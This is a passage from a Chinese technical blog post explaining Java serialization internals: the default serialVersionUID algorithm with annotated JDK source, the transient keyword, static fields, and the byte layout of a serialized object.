class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="comment">// 找不到字段/不是 long/权限问题等 → 一律视为“未声明”</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="动态计算-SerialVersionUID"><a href="#动态计算-SerialVersionUID" class="headerlink" title="动态计算 SerialVersionUID"></a>动态计算 SerialVersionUID</h4><p>对于第二种情况，调用 <code>ObjectOutputStream#writeObject(o)</code> 后有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">at java.io.ObjectStreamClass.getSerialVersionUID(ObjectStreamClass.java:271)</span><br><span class="line">at java.io.ObjectStreamClass.writeNonProxy(ObjectStreamClass.java:819)</span><br><span class="line">at java.io.ObjectOutputStream.writeClassDescriptor(ObjectOutputStream.java:668)</span><br><span class="line">at java.io.ObjectOutputStream.writeNonProxyDesc(ObjectOutputStream.java:1282)</span><br><span class="line">at java.io.ObjectOutputStream.writeClassDesc(ObjectOutputStream.java:1231)</span><br><span class="line">at java.io.ObjectOutputStream.writeOrdinaryObject(ObjectOutputStream.java:1427)</span><br><span class="line">at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1178)</span><br><span class="line">at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)</span><br><span class="line">at Main.main(Main.java:56)</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>writeNonProxy</code> 会通过 <code>getSerialVersionUID</code> 函数获取类的 <code>serialVersionUID</code> 值写入序列化数据：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写“非代理类”的类描述符（class descriptor）基础信息到对象输出流。</span></span><br><span class="line"><span class="comment">// 注意：这是序列化“类信息”的一部分，不是写具体对象实例字段。</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">writeNonProxy</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 1) 写入类名（内部/二进制名称，例：java.lang.String）</span></span><br><span class="line">    out.writeUTF(name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 写入该类的 serialVersionUID（版本戳，决定反序列化兼容性）</span></span><br><span class="line">    out.writeLong(getSerialVersionUID()); <span class="comment">// 后面源码还会继续写 flags、字段列表、注解数据、父类描述符等</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getSerialVersionUID</code> 会判断 <code>suid</code> 属性是否为空，如果 <code>suid</code> 为空说明前期创建当前类对应的 <code>ObjectStreamClass</code> 时没有获取到类定义的 <code>serialVersionUID</code> 的值，那么此时会调用 <code>computeDefaultSUID</code> 计算一个值返回。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回该类的 serialVersionUID。</span></span><br><span class="line"><span class="comment"> * serialVersionUID 用来标识一组“同名且自共同祖先演进而来”的类，它们约定使用相同的</span></span><br><span class="line"><span class="comment"> * 序列化/反序列化格式。若类未实现 Serializable，则其 serialVersionUID 规定为 0L。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">getSerialVersionUID</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (suid == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 懒加载 + 缓存：首次计算默认的 SUID，并缓存到 suid 变量里</span></span><br><span class="line">        suid = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Long&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Long <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">// 依据“默认算法”计算（见《Java Object Serialization Spec §4.6》）：</span></span><br><span class="line">                    <span class="comment">// 以类 cl 的名称、修饰符、实现的接口、字段和方法签名等信息为输入，</span></span><br><span class="line">                    <span class="comment">// 计算 SHA-1 摘要并取前 64 位作为 long 返回。</span></span><br><span class="line">                    <span class="keyword">return</span> computeDefaultSUID(cl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> suid.longValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>computeDefaultSUID</code> 的计算输入包含：<strong>类名、修饰符、（非数组类的）接口名（排序）、字段（筛选后按名排序）、是否有 <code>&lt;clinit&gt;</code>、非私有构造器（按签名排序）、非私有方法（按名与签名排序）</strong>；最终对字节做 <strong>SHA-1</strong>，取前 8 字节组装成 <code>long</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 计算“给定类”的默认 serialVersionUID（当类未显式声明 serialVersionUID 时使用）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">computeDefaultSUID</span><span class="params">(Class&lt;?&gt; cl)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) 非可序列化类 或 JDK 动态代理类：按规范默认返回 0L</span></span><br><span class="line">    <span class="keyword">if</span> (!Serializable.class.isAssignableFrom(cl) || Proxy.isProxyClass(cl)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 2) 用一个内存数据流收集“类签名信息”，稍后对其做 SHA 摘要并取前 64 位作为 SUID</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">dout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(bout);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.1 写入“类的全限定名”</span></span><br><span class="line">        dout.writeUTF(cl.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.2 写入“类修饰符”（只保留这几位）</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">classMods</span> <span class="operator">=</span> cl.getModifiers() &amp;</span><br><span class="line">            (Modifier.PUBLIC | Modifier.FINAL | Modifier.INTERFACE | Modifier.ABSTRACT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 兼容早期 javac 的一个行为差异：</span></span><br><span class="line"><span class="comment">         * 过去只有当接口声明了方法时才会把 ABSTRACT 位置位。</span></span><br><span class="line"><span class="comment">         * 这里做个补偿：如果是接口且 methods.length&gt;0，则强制带 ABSTRACT；否则清掉 ABSTRACT。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Method[] methods = cl.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">if</span> ((classMods &amp; Modifier.INTERFACE) != <span class="number">0</span>) &#123;</span><br><span class="line">            classMods = (methods.length &gt; <span class="number">0</span>)</span><br><span class="line">                ? (classMods | Modifier.ABSTRACT)</span><br><span class="line">                : (classMods &amp; ~Modifier.ABSTRACT);</span><br><span class="line">        &#125;</span><br><span class="line">        dout.writeInt(classMods);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!cl.isArray()) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 兼容 JDK 1.2 FCS 的变更：从那时起，数组类型的 Class.getInterfaces()</span></span><br><span class="line"><span class="comment">             * 会返回 Cloneable 和 Serializable。这里对“非数组类”才写接口信息。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            Class&lt;?&gt;[] interfaces = cl.getInterfaces();</span><br><span class="line">            String[] ifaceNames = <span class="keyword">new</span> <span class="title class_">String</span>[interfaces.length];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">                ifaceNames[i] = interfaces[i].getName();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 接口名按字典序排序后逐个写入</span></span><br><span class="line">            Arrays.sort(ifaceNames);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ifaceNames.length; i++) &#123;</span><br><span class="line">                dout.writeUTF(ifaceNames[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.3 处理“字段签名”</span></span><br><span class="line">        Field[] fields = cl.getDeclaredFields();</span><br><span class="line">        MemberSignature[] fieldSigs = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>[fields.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            fieldSigs[i] = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>(fields[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 字段按“字段名”字典序排序</span></span><br><span class="line">        Arrays.sort(fieldSigs, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fieldSigs.length; i++) &#123;</span><br><span class="line">            <span class="type">MemberSignature</span> <span class="variable">sig</span> <span class="operator">=</span> fieldSigs[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">mods</span> <span class="operator">=</span> sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL | Modifier.VOLATILE |</span><br><span class="line">                 Modifier.TRANSIENT);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 仅在以下情况下写入字段签名：</span></span><br><span class="line"><span class="comment">             *   - 不是 private，或</span></span><br><span class="line"><span class="comment">             *   - 虽是 private，但既不是 static 也不是 transient（即“私有实例字段”）</span></span><br><span class="line"><span class="comment">             * 换言之：“private static 字段”和“private transient 字段”不参与计算。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) ||</span><br><span class="line">                ((mods &amp; (Modifier.STATIC | Modifier.TRANSIENT)) == <span class="number">0</span>)) &#123;</span><br><span class="line">                dout.writeUTF(sig.name);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.4 若类存在静态初始化块（&lt;clinit&gt;），也要写入一个伪方法签名</span></span><br><span class="line">        <span class="keyword">if</span> (hasStaticInitializer(cl)) &#123;</span><br><span class="line">            dout.writeUTF(<span class="string">&quot;&lt;clinit&gt;&quot;</span>);</span><br><span class="line">            dout.writeInt(Modifier.STATIC);</span><br><span class="line">            dout.writeUTF(<span class="string">&quot;()V&quot;</span>); <span class="comment">// 方法签名：无参、void 返回</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.5 处理“构造器签名”</span></span><br><span class="line">        Constructor&lt;?&gt;[] cons = cl.getDeclaredConstructors();</span><br><span class="line">        MemberSignature[] consSigs = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>[cons.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; cons.length; i++) &#123;</span><br><span class="line">            consSigs[i] = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>(cons[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 构造器按“签名字符串”排序</span></span><br><span class="line">        Arrays.sort(consSigs, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ms1.signature.compareTo(ms2.signature);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; consSigs.length; i++) &#123;</span><br><span class="line">            <span class="type">MemberSignature</span> <span class="variable">sig</span> <span class="operator">=</span> consSigs[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">mods</span> <span class="operator">=</span> sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">                 Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">                 Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">            <span class="comment">// 仅写“非 private 构造器”的签名信息</span></span><br><span class="line">            <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">                dout.writeUTF(<span class="string">&quot;&lt;init&gt;&quot;</span>);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                <span class="comment">// 签名里的类型分隔符由 &#x27;/&#x27; 换成 &#x27;.&#x27;（内部名 -&gt; 外部名）</span></span><br><span class="line">                dout.writeUTF(sig.signature.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.6 处理“普通方法签名”</span></span><br><span class="line">        MemberSignature[] methSigs = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>[methods.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">            methSigs[i] = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>(methods[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 方法按“方法名”排序；若同名再按“方法签名”排序</span></span><br><span class="line">        Arrays.sort(methSigs, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">comp</span> <span class="operator">=</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">                <span class="keyword">if</span> (comp == <span class="number">0</span>) &#123;</span><br><span class="line">                    comp = ms1.signature.compareTo(ms2.signature);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> comp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methSigs.length; i++) &#123;</span><br><span class="line">            <span class="type">MemberSignature</span> <span class="variable">sig</span> <span class="operator">=</span> methSigs[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">mods</span> <span class="operator">=</span> sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">                 Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">                 Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">            <span class="comment">// 仅写“非 private 方法”的签名信息</span></span><br><span class="line">            <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">                dout.writeUTF(sig.name);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.x 刷流，准备取出“签名字节”</span></span><br><span class="line">        dout.flush();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 对收集到的“类签名字节”做 SHA 摘要（JDK 的 &quot;SHA&quot; 实际指 SHA-1）</span></span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] hashBytes = md.digest(bout.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 取摘要的前 64 位作为 long（注意这里从高位字节开始拼接，等价于取低端的 8 字节反向组装）</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Math.min(hashBytes.length, <span class="number">8</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            hash = (hash &lt;&lt; <span class="number">8</span>) | (hashBytes[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hash;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="comment">// 内部 I/O 不应出错，若出错转为 Error</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>(ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException ex) &#123;</span><br><span class="line">        <span class="comment">// 理论上 &quot;SHA&quot; 必然存在；若不存在抛安全异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们同样可以反射调用 <code>computeDefaultSUID</code> 来计算指定类的 <code>SerialVersionUID</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.io.ObjectStreamClass&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;computeDefaultSUID&quot;</span>, Class.class);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">suid</span> <span class="operator">=</span> method.invoke(<span class="literal">null</span>, MyClass.class);</span><br><span class="line">System.out.println(suid);</span><br></pre></td></tr></table></figure></div>

<h3 id="transient-关键字"><a href="#transient-关键字" class="headerlink" title="transient 关键字"></a>transient 关键字</h3><p><code>transient</code> 是 Java 的<strong>字段级关键字</strong>，表示<strong>“此字段不参与默认序列化”</strong>。换句话说：当你用 <code>ObjectOutputStream.writeObject(obj)</code> 序列化一个对象时，标了 <code>transient</code> 的字段会被 <strong><code>defaultWriteObject()</code> 跳过</strong>；反序列化时，这些字段会被<strong>置为默认值</strong>（对象为 <code>null</code>、<code>int</code> 为 <code>0</code>、<code>boolean</code> 为 <code>false</code> 等）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> String password; <span class="comment">// 密码不会被序列化</span></span><br></pre></td></tr></table></figure></div>

<h3 id="静态字段"><a href="#静态字段" class="headerlink" title="静态字段"></a>静态字段</h3><p><strong>静态字段（<code>static</code>）默认不参与 Java 的对象序列化</strong>。因为<strong>序列化的是“对象实例状态”</strong>；<code>static</code> 属于<strong>类级别</strong>状态（所有实例共享），不属于某个对象本身。</p>
<p>虽然 <code>static</code> 的<strong>值</strong>不序列化，但<strong>某些 <code>static</code> 字段（非 private）“名称&#x2F;修饰符&#x2F;类型签名”</strong>会参与<strong>默认 <code>serialVersionUID</code> 的计算</strong>。改动这类 <code>static</code> 字段的<strong>签名或修饰符</strong>可能导致默认 SUID 变化，从而引发<strong>兼容性问题</strong>；但这与“字段值是否被序列化”是两回事。</p>
<h1 id="序列化数据结构"><a href="#序列化数据结构" class="headerlink" title="序列化数据结构"></a>序列化数据结构</h1><p>当我们将一个对象（如 <code>new Person(20, &quot;Bob&quot;)</code>）进行 Java 原生序列化（<code>ObjectOutputStream</code>），其输出的数据结构是严格遵守 Java Object Serialization Specification 的格式，包含：</p>
<ul>
<li>顶层流结构（Stream Header）</li>
<li>若干记录（Record），按写入顺序序列化</li>
<li>每个记录前有类型码（type code），表明后续数据的含义</li>
<li>所有对象均带有类描述符、字段值、以及引用句柄机制</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="type">int</span> age;</span><br><span class="line">  String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>写入 <code>new Person(20, &quot;Bob&quot;)</code> 时的结构（示意）：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">AC ED 00 05                               // header</span><br><span class="line">73                                         TC_OBJECT</span><br><span class="line">  72                                       TC_CLASSDESC</span><br><span class="line">    &quot;com.example.Person&quot;                   UTF</span><br><span class="line">    &lt;suid: 8 bytes&gt;                        long</span><br><span class="line">    &lt;flags: SC_SERIALIZABLE&gt;               byte</span><br><span class="line">    00 02                                  fieldCount = 2</span><br><span class="line">      &#x27;I&#x27; &quot;age&quot;                            原始字段</span><br><span class="line">      &#x27;L&#x27; &quot;name&quot; &quot;Ljava/lang/String;&quot;      对象字段</span><br><span class="line">    78                                      TC_ENDBLOCKDATA（类注解块结束，通常为空）</span><br><span class="line">    70                                      TC_NULL（super desc of Object）</span><br><span class="line">  // classdata for Person（默认字段，无 ENDBLOCKDATA）</span><br><span class="line">  00 00 00 14                              age = 20</span><br><span class="line">  74                                       TC_STRING</span><br><span class="line">    &quot;Bob&quot;                                  UTF</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>可以通过 <a class="link"   target="_blank" rel="noopener" href="https://github.com/NickstaDB/SerializationDumper/releases/tag/v1.14" >SerializationDumper<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 将序列化数据转换成方便阅读的形式：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar SerializationDumper-v1.14.jar -r payload.bin</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h2 id="顶层结构"><a href="#顶层结构" class="headerlink" title="顶层结构"></a>顶层结构</h2><p>通常序列化数据前面会有一个固定的字段作为魔数，标识这是一段 Java 对象的序列化数据：</p>
